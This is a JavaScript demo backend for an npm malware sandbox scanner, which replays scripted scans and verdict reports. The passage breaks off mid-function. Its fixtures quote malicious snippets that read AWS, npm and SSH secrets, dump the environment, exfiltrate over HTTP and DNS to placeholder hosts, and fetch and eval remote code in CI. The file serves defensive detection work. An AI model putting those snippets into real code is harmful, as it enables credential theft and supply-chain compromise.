// Demo backend that runs entirely in the browser. Used with ?mock=1, or automatically when no API
// answers. Every scan is a scripted timeline replayed against the wall clock, so a reload mid-scan
// picks up where it was. Scan, event and report shapes are the ones api/ returns (see model.js for the
// event conventions); screenshots, approvals and the "result" of an investigator step are shapes the
// backend does not send yet.

const KEY = 'vulture.mock.v2';
const STAGES = ['fetch', 'static', 'sandbox', 'detonate', 'observe', 'investigate', 'destroy', 'analyze'];
const now = () => Date.now() / 1000;

function hash(s, n = 64) {
  let h1 = 0x811c9dc5, out = '';
  while (out.length < n) {
    for (let i = 0; i < s.length; i++) { h1 ^= s.charCodeAt(i); h1 = Math.imul(h1, 16777619) >>> 0; }
    out += h1.toString(16).padStart(8, '0'); s += out;
  }
  return out.slice(0, n);
}

// ---------------------------------------------------------------- screenshots (fake internet pages)
function shot({ url, title, lines, tone = '#1d1d1f', form }) {
  const rows = lines.map((l, i) => `<text x="80" y="${300 + i * 34}" font-family="Menlo,monospace" font-size="20" fill="${l.c || '#424245'}">${l.t.replace(/&/g, '&amp;').replace(/</g, '&lt;')}</text>`).join('');
  const f = form ? `
    <rect x="390" y="250" width="500" height="430" rx="18" fill="#fff" stroke="#d2d2d7"/>
    <circle cx="640" cy="310" r="28" fill="${tone}"/>
    <text x="640" y="380" text-anchor="middle" font-family="-apple-system,Helvetica" font-size="28" font-weight="600" fill="#1d1d1f">${form.title}</text>
    <text x="640" y="414" text-anchor="middle" font-family="-apple-system,Helvetica" font-size="17" fill="#6e6e73">${form.sub}</text>
    <rect x="430" y="450" width="420" height="52" rx="10" fill="#f5f5f7" stroke="#d2d2d7"/>
    <text x="448" y="483" font-family="-apple-system,Helvetica" font-size="17" fill="#86868b">${form.field}</text>
    <rect x="430" y="520" width="420" height="52" rx="10" fill="#f5f5f7" stroke="#d2d2d7"/>
    <text x="448" y="553" font-family="-apple-system,Helvetica" font-size="17" fill="#86868b">Token</text>
    <rect x="430" y="596" width="420" height="52" rx="26" fill="${tone}"/>
    <text x="640" y="629" text-anchor="middle" font-family="-apple-system,Helvetica" font-size="18" font-weight="600" fill="#fff">${form.cta}</text>` : '';
  const svg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1280 800">
    <rect width="1280" height="800" fill="${form ? '#f5f5f7' : '#ffffff'}"/>
    <rect width="1280" height="64" fill="#ececee"/>
    <circle cx="32" cy="32" r="7" fill="#ff5f57"/><circle cx="56" cy="32" r="7" fill="#febc2e"/><circle cx="80" cy="32" r="7" fill="#28c840"/>
    <rect x="300" y="16" width="680" height="32" rx="9" fill="#fff"/>
    <text x="640" y="38" text-anchor="middle" font-family="-apple-system,Helvetica" font-size="15" fill="#6e6e73">${url}</text>
    ${form ? '' : `<text x="80" y="170" font-family="-apple-system,Helvetica" font-size="46" font-weight="700" fill="${tone}">${title}</text>
    <rect x="80" y="210" width="1120" height="1" fill="#d2d2d7"/>`}
    ${rows}${f}
  </svg>`;
  return 'data:image/svg+xml;charset=utf-8,' + encodeURIComponent(svg);
}

// ---------------------------------------------------------------- timeline helpers
const VMID = 'f3a961c2-7b1e-4c55-9d0a-2e61d4b8a917';
const argText = a => Object.entries(a).map(([k, v]) => `${k}=${v}`).join(', ');
const AI = (at, step, tool, args, thought, result) => ({ at, stage: 'investigate', msg: `step ${step}: ${tool}(${argText(args)})`, data: { step, tool, args, thought, result } });
const SHOT = (at, url, image, vision) => ({ at, stage: 'observe', msg: `browser: opened ${url}`, data: { screenshot: image, url, vision } });

function prefix(spec, { pinned, sha, findings, scripts }) {
  return [
    { at: 0.2, stage: 'sandbox', msg: 'creating throwaway Vultr instance', data: { vm: 'creating' } },
    { at: 1.4, stage: 'sandbox', msg: `VM created (${VMID.slice(0, 8)}), waiting for it to boot`, data: { vm: 'created' } },
    { at: 3.6, stage: 'sandbox', msg: 'VM booted and ready in 58s', data: { vm: 'ready' } },
    { at: 3.9, stage: 'sandbox', msg: 'resource limits', data: { limits: { scan_timeout: 1500 } } },
    { at: 4.2, stage: 'fetch', msg: `fetching ${spec}` },
    { at: 5.0, stage: 'fetch', msg: `npm pack ${spec}` },
    { at: 6.0, stage: 'fetch', msg: `pinned ${pinned}`, data: { meta: { pinned, sha256: sha } } },
    { at: 6.6, stage: 'fetch', msg: 'installing dependencies with --ignore-scripts (nothing executes yet)' },
    { at: 7.4, stage: 'static', msg: 'scanning source' },
    { at: 8.2, stage: 'static', msg: `${findings} findings, ${scripts} install scripts` },
    { at: 8.8, stage: 'sandbox', msg: 'building isolated network + fake internet' },
    { at: 9.6, stage: 'sandbox', msg: 'sinkhole up at 172.30.0.2; honeytoken marker VLT9F21C04B7E', data: { personas: ['developer', 'ci'], clocks: ['0', '+90d'] } },
  ];
}

function runs(start, defs) {
  // defs: [{run, steps: ['postinstall'], hits, net, procs, retry?}]
  const out = []; let at = start;
  for (const d of defs) {
    out.push({ at, stage: 'detonate', msg: `run ${d.run}: planting honeytokens`, data: { run: d.run } }); at += 0.7;
    if (d.retry) {
      out.push({ at, stage: 'detonate', msg: `run ${d.run}: worker ran out of memory, running it again`, data: { run: d.run, retry: 1, retry_reason: 'worker ran out of memory' } }); at += 1.0;
    }
    for (const st of d.steps || []) { out.push({ at, stage: 'detonate', msg: `run ${d.run}: ${st} script`, data: { run: d.run } }); at += 1.1; }
    out.push({ at, stage: 'detonate', msg: `run ${d.run}: loading entry points`, data: { run: d.run } }); at += 0.9;
    out.push({ at, stage: 'detonate', msg: `run ${d.run}: ${d.hits} honeytoken hits, ${d.net} network calls`, data: { run: d.run, honeytoken_hits: d.hits, network: d.net, processes: d.procs ?? 0, state: 'done' } }); at += 0.5;
  }
  return { events: out, at };
}

/** Investigator stop, teardown and verdict: the same tail for every finished scan. */
function finish(at, verdict, leaning, unexplained = [], reruns = 0) {
  return [
    { at, stage: 'investigate', msg: 'investigation complete', data: { stop_reason: 'concluded', reruns, conclusion: { leaning, unexplained } } },
    { at: at + 0.6, stage: 'destroy', msg: 'sandbox destroyed: 2 containers, 1 network, 1 volume removed', data: { lifecycle: { containers: 2, networks: 1, volumes: 1, destroyed: true, leftover: [] } } },
    { at: at + 1.4, stage: 'destroy', msg: 'Vultr VM destroyed', data: { vm: 'destroyed', vm_report: { vm_id: VMID, destroyed: true } } },
    { at: at + 1.8, stage: 'analyze', msg: 'agent reviewing traces + dormant code' },
    { at: at + 2.6, stage: 'analyze', msg: `verdict: ${verdict.toUpperCase()}` },
  ];
}
const DONE = 2.8; // seconds from finish() to the end of the scan

const isolation = {
  technology: 'docker (runc) container on a throwaway Vultr VM that is deleted after the scan',
  network: 'internal docker network without internet; DNS and traffic go to a sinkhole (fake internet)',
  filesystem: 'read-only root, package volume mounted read-only, writable tmpfs /tmp',
  privileges: 'all capabilities dropped, no-new-privileges',
};

const HOME = { developer: '/home/alice', ci: '/home/runner' };

// ---------------------------------------------------------------- scenarios
function stealer(spec = 'fake-stealer@1.0.0') {
  const sha = hash(spec);
  const pinned = 'fake-stealer@1.0.0';
  const R = ['developer', 'developer+90d', 'ci', 'ci+90d'];
  const r = runs(10.4, R.map(run => ({ run, steps: ['postinstall'], hits: 4, net: 2, procs: 2, retry: run === 'ci' })));
  let at = r.at;
  const timeline = [
    ...prefix(spec, { pinned, sha, findings: 5, scripts: 1 }),
    ...r.events,
    { at, stage: 'observe', msg: '8 events caught by the fake internet' },
    SHOT(at + 0.6, 'http://collect.exfil-sample.invalid/c', shot({ url: 'collect.exfil-sample.invalid/c', title: 'POST /c  ·  200 OK', tone: '#d70015', lines: [
        { t: '{' }, { t: '  "host": "alice-mbp",' }, { t: '  "loot": {', }, { t: '    ".aws/credentials": "[default] aws_access_key_id = AKIAVLT9F21C04B7…",', c: '#d70015' },
        { t: '    ".npmrc": "//registry.npmjs.org/:_authToken=npm_VLT9F21C04B7…",', c: '#d70015' },
        { t: '    ".ssh/id_rsa": "-----BEGIN OPENSSH PRIVATE KEY----- VLT9F21C…",', c: '#d70015' },
        { t: '    ".env": "STRIPE_SECRET_KEY=sk_live_VLT9F21C04B7…",', c: '#d70015' }, { t: '  }' }, { t: '}' }] }),
      'a bare JSON drop endpoint, not a website. The captured body holds AWS, npm, SSH and Stripe secrets carrying our marker.'),
    SHOT(at + 1.2, 'registry page · fake-stealer', shot({ url: 'registry.example/package/fake-stealer', title: 'fake-stealer  1.0.0', lines: [
        { t: 'HARMLESS test sample that behaves like credential-stealing malware.' }, { t: '' }, { t: 'scripts.postinstall:  node setup.js', c: '#b25000' }, { t: 'weekly downloads:    12' }, { t: 'published:           2 days ago by a new account' }] }),
      'brand-new publisher, almost no downloads, and a postinstall hook. Classic typosquat profile.'),
    AI(at + 1.8, 1, 'read_file', { path: 'setup.js' }, 'The postinstall hook runs setup.js, so that is where to start', 'Base64-decodes a hostname at runtime, reads four secret files, then POSTs them'),
    { at: at + 3.4, stage: 'investigate', msg: 'step 2: model call failed, retrying', data: { retry: 1, error: 'APITimeoutError' } },
    AI(at + 4.2, 2, 'grep', { pattern: 'readFileSync|homedir' }, 'Is the credential reading limited to setup.js, or hidden elsewhere too', 'Four matches, all in setup.js. index.js is clean'),
    AI(at + 6.2, 3, 'rerun', { persona: 'ci', clock: '+365d' }, 'Check whether it behaves differently a year from now', 'The same theft again, so it is not waiting for a date'),
    ...finish(at + 8.0, 'malware', 'malware', [], 1),
  ];
  at += 8.0 + DONE;
  const honey = [];
  for (const run of R) {
    const h = HOME[run.replace(/\+.*/, '')];
    for (const f of ['.aws/credentials', '.npmrc', '.ssh/id_rsa']) honey.push({ file: `${h}/${f}`, op: 'read', run });
    honey.push({ file: '/project/.env', op: 'read', run });
  }
  const report = {
    verdict: 'malware', verdict_source: 'rules', isolation,
    rules: { verdict: 'malware', risk_score: 100, confirmed: true,
      reasons: ['honeytoken marker found in outbound traffic (exfiltration confirmed)', 'postinstall script reads ~/.aws/credentials, ~/.npmrc and ~/.ssh/id_rsa', 'hostname hidden with base64'],
      coverage: { executed: true, runs: {}, reason: null } },
    ai: { verdict: 'malware', confidence: 0.97,
      summary: 'fake-stealer runs a postinstall script that reads your AWS keys, npm token, SSH private key and project .env, then sends them to collect.exfil-sample.invalid. It does this on every install, on a laptop and in CI alike.',
      recommendation: 'Do not install. If it already ran anywhere, rotate AWS keys, npm tokens and SSH keys on that machine.',
      indicators: [
        { severity: 'high', title: 'Credentials sent to a remote host', evidence: 'POST collect.exfil-sample.invalid/c carried the honeytoken marker VLT9F21C04B7E' },
        { severity: 'high', title: 'Reads secret files at install time', evidence: 'setup.js:5 readFileSync(~/.aws/credentials, ~/.npmrc, ~/.ssh/id_rsa)' },
        { severity: 'medium', title: 'Obfuscated destination', evidence: "setup.js:3 Buffer.from('Y29sbGVjdC5…', 'base64')" },
        { severity: 'medium', title: 'Dumps the whole environment', evidence: 'setup.js:10 JSON.stringify(process.env)' },
      ],
      dormant_triggers: [] },
    evidence: {
      target: { name: 'fake-stealer', version: '1.0.0', pinned, sha256: sha, kind: 'npm' },
      install_scripts: [{ package: 'fake-stealer', hook: 'postinstall', command: 'node setup.js' }],
      static_summary: { high: 3, medium: 2, low: 1 },
      static_findings: [
        { severity: 'high', rule: 'reads-credential-file', file: 'setup.js', line: 5, snippet: "for (const f of ['.aws/credentials', '.npmrc', '.ssh/id_rsa'])", capability: 'credential-access' },
        { severity: 'high', rule: 'env-dump', file: 'setup.js', line: 10, snippet: 'loot.env = JSON.stringify(process.env);', capability: 'credential-access' },
        { severity: 'high', rule: 'http-request-in-install', file: 'setup.js', line: 12, snippet: "http.request({ host, port: 80, path: '/c', method: 'POST' ...", capability: 'network' },
        { severity: 'medium', rule: 'base64-decode', file: 'setup.js', line: 3, snippet: "Buffer.from('Y29sbGVjdC5leGZpbC1zYW1wbGUuaW52YWxpZA==', 'base64')", capability: 'obfuscation' },
        { severity: 'medium', rule: 'homedir-access', file: 'setup.js', line: 6, snippet: 'path.join(os.homedir(), f)', capability: 'credential-access' },
      ],
      honeytoken_access: honey,
      exfiltration: R.map(run => ({ kind: 'http', method: 'POST', host: 'collect.exfil-sample.invalid', path: '/c', port: 80, run })),
      dns_lookups: ['collect.exfil-sample.invalid'],
      requests: R.map(run => ({ kind: 'http', host: 'collect.exfil-sample.invalid', path: '/c', port: 80, body: '{"host":"alice-mbp","loot":{".aws/credentials":"[default]\\naws_access_key_id = AKIAVLT9F21C…', run })),
      connections: [],
      processes: R.flatMap(run => [{ argv: ['sh', '-c', 'node setup.js'], run }, { argv: ['node', 'setup.js'], run }]),
      files_written_outside_project: [],
      dormant_code: [], trigger_conditions: [],
      matrix: Object.fromEntries(R.map(run => [run, { honeytoken_hits: 4, network: 2, processes: 2 }])),
    },
  };
  return { source: spec, timeline, end: at, report };
}

function timebomb(spec = 'chrono-helpers@2.4.1') {
  const pinned = 'chrono-helpers@2.4.1', sha = hash(spec);
  const R = ['developer', 'developer+90d', 'ci', 'ci+90d'];
  const bomb = run => run.endsWith('+90d');
  const r = runs(10.4, R.map(run => ({ run, steps: ['postinstall'], hits: bomb(run) ? 2 : 0, net: bomb(run) ? 3 : 0, procs: 1 })));
  let at = r.at;
  const timeline = [
    ...prefix(spec, { pinned, sha, findings: 3, scripts: 1 }),
    ...r.events,
    { at, stage: 'observe', msg: '6 events caught by the fake internet' },
    SHOT(at + 0.6, 'repository · chrono-helpers', shot({ url: 'git.example/chrono-helpers', title: 'chrono-helpers', lines: [
        { t: 'Tiny, dependency-free date helpers.' }, { t: '' }, { t: '✓ zero dependencies' }, { t: '✓ no network access', c: '#d70015' }, { t: '✓ works in Node and the browser' }] }),
      'the README promises “no network access”. The +90 day runs contradict that.'),
    AI(at + 1.2, 1, 'grep', { pattern: 'Date.now|new Date' }, 'Today’s runs were clean but the +90 day runs read secrets, so there should be a date check', 'lib/tz.js:41  if (Date.now() > 1767225600000) require("./sync")'),
    AI(at + 3.4, 2, 'read_file', { path: 'lib/sync.js' }, 'What does the code behind that check do', 'Reads ~/.npmrc and ~/.git-credentials and encodes them into DNS lookups for *.t.cdn-sample.invalid'),
    AI(at + 5.6, 3, 'rerun', { persona: 'developer', clock: '+365d' }, 'Confirm it stays armed after the trigger date', 'Two secrets read and three DNS lookups again: armed from 1 January 2026 onward'),
    ...finish(at + 7.4, 'malware', 'malware', [], 1),
  ];
  at += 7.4 + DONE;
  const report = {
    verdict: 'malware', verdict_source: 'rules', isolation,
    rules: { verdict: 'malware', risk_score: 92, confirmed: true,
      reasons: ['honeytoken marker found in DNS lookups (exfiltration confirmed) in the +90d runs only', 'date-gated code path in lib/tz.js'],
      coverage: { executed: true, runs: {}, reason: null } },
    ai: { verdict: 'malware', confidence: 0.94,
      summary: 'chrono-helpers behaves normally today. Once the clock passes 1 January 2026 its postinstall loads lib/sync.js, which reads your npm and git tokens and leaks them through DNS lookups. Only the time-shifted runs caught it.',
      recommendation: 'Do not install. Pin away from 2.4.x and check lockfiles for it.',
      indicators: [
        { severity: 'high', title: 'Time bomb', evidence: 'lib/tz.js:41 if (Date.now() > 1767225600000) require("./sync")' },
        { severity: 'high', title: 'Secrets leaked through DNS', evidence: 'npm_VLT9F21C… encoded in lookups for *.t.cdn-sample.invalid' },
        { severity: 'medium', title: 'README contradicts behaviour', evidence: 'claims “no network access”' },
      ],
      dormant_triggers: [{ file: 'lib/tz.js', condition: 'Date.now() > 2026-01-01', would_do: 'load lib/sync.js and exfiltrate ~/.npmrc and ~/.git-credentials over DNS' }] },
    evidence: {
      target: { name: 'chrono-helpers', version: '2.4.1', pinned, sha256: sha, kind: 'npm' },
      install_scripts: [{ package: 'chrono-helpers', hook: 'postinstall', command: 'node lib/tz.js --warm' }],
      static_summary: { high: 1, medium: 2, low: 3 },
      static_findings: [
        { severity: 'high', rule: 'time-gate', file: 'lib/tz.js', line: 41, snippet: 'if (Date.now() > 1767225600000) require("./sync")', capability: 'evasion' },
        { severity: 'medium', rule: 'dns-lookup', file: 'lib/sync.js', line: 18, snippet: 'dns.resolve(`${chunk}.t.cdn-sample.invalid`)', capability: 'network' },
        { severity: 'medium', rule: 'reads-credential-file', file: 'lib/sync.js', line: 9, snippet: "fs.readFileSync(path.join(os.homedir(), '.npmrc'))", capability: 'credential-access' },
      ],
      honeytoken_access: R.filter(bomb).flatMap(run => [
        { file: `${HOME[run.replace(/\+.*/, '')]}/.npmrc`, op: 'read', run }, { file: `${HOME[run.replace(/\+.*/, '')]}/.git-credentials`, op: 'read', run }]),
      exfiltration: R.filter(bomb).map(run => ({ kind: 'dns', host: 'bnBtX1ZMVDlGMjFD.t.cdn-sample.invalid', run })),
      dns_lookups: ['bnBtX1ZMVDlGMjFD.t.cdn-sample.invalid', 'MDRCN0UwMDAwMDAw.t.cdn-sample.invalid', 'Z2hwX1ZMVDlGMjFD.t.cdn-sample.invalid'],
      requests: [], connections: [],
      processes: R.map(run => ({ argv: ['node', 'lib/tz.js', '--warm'], run })),
      files_written_outside_project: [],
      dormant_code: [], trigger_conditions: [{ file: 'lib/tz.js', line: 41, rule: 'time-gate' }],
      matrix: Object.fromEntries(R.map(run => [run, { honeytoken_hits: bomb(run) ? 2 : 0, network: bomb(run) ? 3 : 0, processes: 1 }])),
    },
  };
  return { source: spec, timeline, end: at, report };
}

function ciOnly(spec = 'release-notes-gen@0.3.1', scanId = 'demo') {
  const pinned = 'release-notes-gen@0.3.1', sha = hash(spec);
  const R = ['developer', 'developer+90d', 'ci', 'ci+90d'];
  const ci = run => run.startsWith('ci');
  const r = runs(10.4, R.map(run => ({ run, steps: ['preinstall'], hits: 0, net: ci(run) ? 2 : 0, procs: ci(run) ? 2 : 1 })));
  let at = r.at;
  const gateAt = at + 4.6;
  const approval = {
    id: `ap-${scanId}`, kind: 'live_internet', title: 'Detonate with the real internet',
    detail: 'In CI it downloads a second stage from dl.cdn-sample.invalid that the fake internet can’t serve. The AI investigator wants to re-run it on a fresh VM with real outbound traffic to see what that payload does.',
  };
  const timeline = [
    ...prefix(spec, { pinned, sha, findings: 2, scripts: 1 }),
    ...r.events,
    { at, stage: 'observe', msg: '4 events caught by the fake internet' },
    SHOT(at + 0.6, 'https://auth-ci-sample.invalid/login', shot({ url: 'auth-ci-sample.invalid/login', form: { title: 'Sign in to continue', sub: 'Your CI session expired', field: 'Username', cta: 'Verify token' }, tone: '#5e5ce6', lines: [] }),
      'a fake sign-in page asking for a CI token, styled like a generic CI provider. Phishing.'),
    AI(at + 1.2, 1, 'grep', { pattern: 'process.env.CI|GITHUB_' }, 'Only the CI runs made network calls, so there should be a CI check', 'index.js:12  if (process.env.GITHUB_ACTIONS) fetch(stage2Url())'),
    AI(at + 3.0, 2, 'read_file', { path: 'index.js' }, 'Where does the second stage come from', 'stage2Url() builds https://dl.cdn-sample.invalid/s2.js, which the fake internet cannot serve'),
    { at: gateAt, stage: 'investigate', msg: 'waiting for approval: detonate with the real internet', data: { approval: { ...approval, state: 'pending' } } },
    // approved
    { at: gateAt + 0.4, when: 'approved', stage: 'investigate', msg: 'approved: live-internet run on a fresh VM', data: { approval: { id: approval.id, state: 'approved' } } },
    { at: gateAt + 2.4, when: 'approved', stage: 'investigate', msg: 'run ci (live internet): preinstall script' },
    { at: gateAt + 4.2, when: 'approved', stage: 'investigate', msg: 'live run: dl.cdn-sample.invalid returned 404, the second stage has been taken down' },
    // rejected
    { at: gateAt + 0.4, when: 'rejected', stage: 'investigate', msg: 'rejected: live-internet run skipped, judging from sandbox evidence only', data: { approval: { id: approval.id, state: 'rejected' } } },
    AI(gateAt + 5.0, 3, 'list_files', { path: 'bin' }, 'With no second stage online, check what else ships in the package', 'One CLI script that prints release notes. No further network or file access'),
    ...finish(gateAt + 6.4, 'suspicious', 'suspicious', ['What the second stage at dl.cdn-sample.invalid/s2.js would have run'], 0),
  ];
  const end = gateAt + 6.4 + DONE;
  const report = {
    verdict: 'suspicious', verdict_source: 'ai', isolation,
    rules: { verdict: 'suspicious', risk_score: 58, confirmed: false,
      reasons: ['network calls only when CI=true / GITHUB_ACTIONS=true', 'downloads and evaluates remote code'],
      unresolved: ['What the second stage at dl.cdn-sample.invalid/s2.js would have run'],
      coverage: { executed: true, runs: {}, reason: null } },
    ai: { verdict: 'suspicious', confidence: 0.78,
      summary: 'release-notes-gen looks harmless on a laptop. On a CI runner its preinstall fetches a second-stage script from dl.cdn-sample.invalid and points to a fake CI sign-in page. The payload was offline, so no theft was observed.',
      recommendation: 'Avoid in CI pipelines. If you need it, pin an older version and run it with no tokens in the environment.',
      indicators: [
        { severity: 'high', title: 'CI-only behaviour', evidence: 'index.js:12 if (process.env.GITHUB_ACTIONS) fetch(stage2Url())' },
        { severity: 'medium', title: 'Remote code download', evidence: 'https://dl.cdn-sample.invalid/s2.js' },
        { severity: 'medium', title: 'Links a phishing page', evidence: 'auth-ci-sample.invalid/login asks for a CI token' },
      ],
      dormant_triggers: [{ file: 'index.js', condition: 'GITHUB_ACTIONS is set and stage 2 is online', would_do: 'download and eval s2.js with GITHUB_TOKEN and NPM_TOKEN in scope' }] },
    evidence: {
      target: { name: 'release-notes-gen', version: '0.3.1', pinned, sha256: sha, kind: 'npm' },
      install_scripts: [{ package: 'release-notes-gen', hook: 'preinstall', command: 'node index.js --prepare' }],
      static_summary: { high: 1, medium: 1, low: 2 },
      static_findings: [
        { severity: 'high', rule: 'eval-remote', file: 'index.js', line: 14, snippet: 'new Function(await (await fetch(stage2Url())).text())()', capability: 'execution' },
        { severity: 'medium', rule: 'ci-detection', file: 'index.js', line: 12, snippet: 'if (process.env.GITHUB_ACTIONS)', capability: 'evasion' },
      ],
      honeytoken_access: [], exfiltration: [],
      dns_lookups: ['dl.cdn-sample.invalid', 'auth-ci-sample.invalid'],
      requests: R.filter(ci).map(run => ({ kind: 'tls', sni: 'dl.cdn-sample.invalid', port: 443, run })),
      connections: [],
      processes: R.flatMap(run => ci(run) ? [{ argv: ['node', 'index.js', '--prepare'], run }, { argv: ['sh', '-c', 'git log --oneline -20'], run }] : [{ argv: ['node', 'index.js', '--prepare'], run }]),
      files_written_outside_project: [],
      dormant_code: [], trigger_conditions: [{ file: 'index.js', line: 12, rule: 'ci-detection' }],
      matrix: Object.fromEntries(R.map(run => [run, { honeytoken_hits: 0, network: ci(run) ? 2 : 0, processes: ci(run) ? 2 : 1 }])),
    },
  };
  return { source: spec, timeline, end, report, gate: { at: gateAt, approval: { ...approval, requested_by: 'AI investigator' } } };
}

function safe(spec = 'left-pad@1.3.0') {
  const m = /^(@?[^@]+)(?:@(.+))?$/.exec(spec.replace(/^upload:/, '').replace(/\.t?gz$|\.tar$|\.zip$/, ''));
  const name = m ? m[1].replace(/^https:\/\/github\.com\//, '') : spec, version = (m && m[2]) || '1.3.0';
  const pinned = `${name}@${version}`, sha = hash(spec);
  const R = ['developer', 'developer+90d', 'ci', 'ci+90d'];
  const r = runs(10.4, R.map(run => ({ run, steps: [], hits: 0, net: 0, procs: 0 })));
  let at = r.at;
  const timeline = [
    ...prefix(spec, { pinned, sha, findings: 0, scripts: 0 }),
    ...r.events,
    { at, stage: 'observe', msg: '0 events caught by the fake internet' },
    AI(at + 0.8, 1, 'read_file', { path: 'index.js' }, 'No install scripts and nothing touched the network. Reading the entry point to be sure', 'A small pure function with no requires and no I/O'),
    ...finish(at + 2.4, 'safe', 'safe'),
  ];
  at += 2.4 + DONE;
  const report = {
    verdict: 'safe', verdict_source: 'rules', isolation,
    rules: { verdict: 'safe', risk_score: 0, confirmed: false, reasons: [], coverage: { executed: true, runs: {}, reason: null } },
    ai: { verdict: 'safe', confidence: 0.93,
      summary: `${name} has no install scripts. Its entry point loaded cleanly on a developer laptop and a CI runner, today and 90 days from now, without reading a single planted secret or touching the network.`,
      recommendation: 'Fine to install.', indicators: [], dormant_triggers: [] },
    evidence: {
      target: { name, version, pinned, sha256: sha, kind: 'npm' }, install_scripts: [],
      static_summary: { high: 0, medium: 0, low: 1 },
      static_findings: [{ severity: 'low', rule: 'string-concat-loop', file: 'index.js', line: 12, snippet: 'while (true) { if (len & 1) pad += ch; ...', capability: 'none' }],
      honeytoken_access: [], exfiltration: [], dns_lookups: [], requests: [], connections: [], processes: [],
      files_written_outside_project: [], dormant_code: [], trigger_conditions: [],
      matrix: Object.fromEntries(R.map(run => [run, { honeytoken_hits: 0, network: 0, processes: 0 }])),
    },
  };
  return { source: spec, timeline, end: at, report };
}

function incomplete(spec = '@types/node@22.10.0') {
  const pinned = '@types/node@22.10.0', sha = hash(spec);
  const R = ['developer', 'developer+90d', 'ci', 'ci+90d'];
  const r = runs(10.4, R.map(run => ({ run, steps: [], hits: 0, net: 0 })));
  let at = r.at;
  const timeline = [
    ...prefix(spec, { pinned, sha, findings: 0, scripts: 0 }),
    ...r.events,
    { at, stage: 'observe', msg: '0 events caught by the fake internet' },
    AI(at + 0.8, 1, 'list_files', { path: '.' }, 'No install scripts and no entry point ran. Is there any code at all', 'Only .d.ts type declarations, nothing executable'),
    ...finish(at + 2.2, 'incomplete', 'safe', ['Nothing in the package could be executed, so nothing was observed']),
  ];
  at += 2.2 + DONE;
  const report = {
    verdict: 'incomplete', verdict_source: 'rules', isolation,
    rules: { verdict: 'incomplete', risk_score: 0, confirmed: false,
      reasons: ['nothing executed: no install scripts and no entry point found'],
      coverage: { executed: false, runs: {}, reason: 'nothing executed: no install scripts and no entry point found' } },
    ai: { verdict: 'safe', confidence: 0.6, summary: '@types/node ships only TypeScript declarations. There is nothing to run, so the sandbox could not watch it do anything.', recommendation: 'Type-only packages are low risk, but this scan cannot vouch for it.', indicators: [], dormant_triggers: [] },
    evidence: {
      target: { name: '@types/node', version: '22.10.0', pinned, sha256: sha, kind: 'npm' }, install_scripts: [],
      static_summary: { high: 0, medium: 0, low: 0 }, static_findings: [],
      honeytoken_access: [], exfiltration: [], dns_lookups: [], requests: [], connections: [], processes: [],
      files_written_outside_project: [], dormant_code: [], trigger_conditions: [],
      matrix: Object.fromEntries(R.map(run => [run, { honeytoken_hits: 0, network: 0, processes: 0 }])),
    },
  };
  return { source: spec, timeline, end: at, report };
}

function notFound(spec) {
  return { source: spec, failed: 'npm package not found', end: 7.4, timeline: [
    { at: 0.2, stage: 'sandbox', msg: 'creating throwaway Vultr instance', data: { vm: 'creating' } },
    { at: 1.4, stage: 'sandbox', msg: `VM created (${VMID.slice(0, 8)}), waiting for it to boot`, data: { vm: 'created' } },
    { at: 3.6, stage: 'sandbox', msg: 'VM booted and ready in 58s', data: { vm: 'ready' } },
    { at: 3.9, stage: 'sandbox', msg: 'resource limits', data: { limits: { scan_timeout: 1500 } } },
    { at: 4.2, stage: 'fetch', msg: `fetching ${spec}` },
    { at: 5.0, stage: 'fetch', msg: `npm pack ${spec}` },
    { at: 6.2, stage: 'destroy', msg: 'sandbox destroyed: 1 containers, 0 network, 1 volume removed', data: { lifecycle: { containers: 1, networks: 0, volumes: 1, destroyed: true, leftover: [] } } },
    { at: 7.0, stage: 'destroy', msg: 'Vultr VM destroyed', data: { vm: 'destroyed', vm_report: { vm_id: VMID, destroyed: true } } },
  ] };
}

export const SCENARIOS = { stealer, timebomb, ciOnly, safe, incomplete, notFound };

export function pickScenario(source) {
  const s = source.toLowerCase();
  if (/stealer/.test(s)) return 'stealer';
  if (/chrono|bomb|time/.test(s)) return 'timebomb';
  if (/release-notes|ci-only|ci-sniff/.test(s)) return 'ciOnly';
  if (/^@types\//.test(s)) return 'incomplete';
  if (/does-not-exist|404/.test(s)) return 'notFound';
  return 'safe';
}

// ---------------------------------------------------------------- store
function load() {
  try { const s = JSON.parse(localStorage.getItem(KEY)); if (s && s.scans) return s; } catch {}
  return seed();
}
function save(s) { localStorage.setItem(KEY, JSON.stringify(s)); }

function seed() {
  const t = now();
  const gate = SCENARIOS.ciOnly().gate.at;
  const s = {
    scans: [
      { id: 'demo-ci0731', scenario: 'ciOnly', source: 'release-notes-gen@0.3.1', createdAt: t - gate - 40 },
      { id: 'demo-tb4f12', scenario: 'timebomb', source: 'chrono-helpers@2.4.1', createdAt: t - 3000 },
      { id: 'demo-st9a01', scenario: 'stealer', source: 'fake-stealer@1.0.0', createdAt: t - 11000 },
      { id: 'demo-lp2210', scenario: 'safe', source: 'left-pad@1.3.0', createdAt: t - 86000 },
      { id: 'demo-ty0815', scenario: 'incomplete', source: '@types/node@22.10.0', createdAt: t - 170000 },
      { id: 'demo-nf0404', scenario: 'notFound', source: 'lodahs-utils', createdAt: t - 175000 },
    ],
    approvals: [
      { id: 'ap-pub-1', scan_id: 'demo-st9a01', source: 'fake-stealer@1.0.0', kind: 'publish_verdict', title: 'File an npm abuse report',
        detail: 'Send the malware verdict and the evidence to the registry’s abuse team', requested_by: 'AI investigator',
        requested_at: t - 10900, expires_at: t - 10000, state: 'approved', decided_by: 'you', decided_at: t - 10700 },
      { id: 'ap-spend-1', scan_id: 'demo-tb4f12', source: 'chrono-helpers@2.4.1', kind: 'spend', title: 'Run a 365-day clock sweep on a bigger VM',
        detail: 'vc2-4c-8gb for about 12 minutes, roughly $0.02', requested_by: 'AI investigator',
        requested_at: t - 2900, expires_at: t - 2000, state: 'rejected', decided_by: 'you', decided_at: t - 2850 },
    ],
  };
  save(s);
  return s;
}

let store = null;
const db = () => (store ||= load());

function materialize(rec, after = 0) {
  const sc = SCENARIOS[rec.scenario](rec.source, rec.id);
  const s = db();
  const started = rec.createdAt + (rec.shift || 0);
  let elapsed = now() - started, decision = null;
  if (sc.gate) {
    let ap = s.approvals.find(a => a.id === sc.gate.approval.id);
    if (!ap && elapsed >= sc.gate.at && rec.cancelledAt == null) {
      ap = { ...sc.gate.approval, scan_id: rec.id, source: rec.source, state: 'pending', requested_at: started + sc.gate.at, expires_at: started + sc.gate.at + 1800 };
      s.approvals.unshift(ap); save(s);
    }
